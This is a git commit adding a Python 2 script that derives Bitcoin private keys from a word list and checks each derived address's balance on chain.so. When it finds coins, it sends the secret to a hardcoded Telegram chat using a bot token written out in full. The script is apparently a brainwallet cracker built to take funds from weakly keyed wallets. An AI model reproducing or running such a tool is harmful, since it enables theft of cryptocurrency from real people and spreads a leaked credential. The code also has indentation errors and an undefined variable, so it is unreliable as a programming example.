05c7323779764c022567b9ee7357459ea2bdb71c
Aknik <kinka@tutanota.de>
2015-11-15 22:04:52 +0100

    Create main.py

---
+++ main.py
@@ -0,0 +1,61 @@
+# -*- coding: utf-8 -*-
+
+from bitcoin import * 
+BASE_URL = 'https://api.telegram.org/bot'
+Token = '109206957:AAElM9hVB5AhkF9ojNZi2PlWYDFZdBUyXTQ' #ticker bot VERDE
+
+def reply(msg,chat_id):
+    
+    url = BASE_URL + Token + '/sendMessage' 
+
+    r = requests.post(url, data = { 
+    'chat_id':chat_id ,'text': msg.encode('utf-8'),
+    'disable_web_page_preview': 'true' , 'reply_to_message_id': '' 
+        })
+    return 
+
+s = open('english.txt','r').read().strip()
+lines = s.split('\n')
+
+for line in lines:
+
+  print line
+  
+  address = privtoaddr(line)
+
+  url = "https://chain.so/api/v2/get_address_balance/BTC/" + address
+
+  headers = {'Content-Type': 'application/json',
+              'Accept-Encoding': 'gzip, deflate' ,
+              'User-Agent': 'Ninguno' ,
+              'Connection': 'keep-alive'}
+
+  btc = 0
+
+  r = requests.get(url,headers=headers)
+
+  if r.status_code == 200:
+
+    data=r.json()
+
+    #print data
+
+    btc = (float (data['data']['confirmed_balance']))
+        
+    #print btc
+    sys.stdout.write('%s\r' % str(btc))
+    sys.stdout.flush()
+
+      if (btc > 0) :
+            
+        print mnemonic,btc
+             
+        msg = mnemonic
+    
+        chat_id = '6660201'
+    
+        reply(msg,chat_id)
+             
+        break
+  
+
